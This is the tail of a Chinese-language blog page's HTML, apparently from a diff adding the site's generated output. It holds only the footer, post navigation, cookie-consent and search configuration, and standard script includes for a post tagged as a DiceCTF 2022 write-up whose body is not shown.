+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-07</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/dicectf2022-containment-breach/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/writeups/">Writeups</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/dicectf2022/" class="prev" rel="prev" title="DiceCTF2022"><i class="fas fa-angle-left fa-fw"></i>DiceCTF2022</a>
+            <a href="/d-3ctf2022-d3bpf/" class="next" rel="next" title="D^3CTF2022-d3bpf&amp;v2">D^3CTF2022-d3bpf&amp;v2<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Niebelungen</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
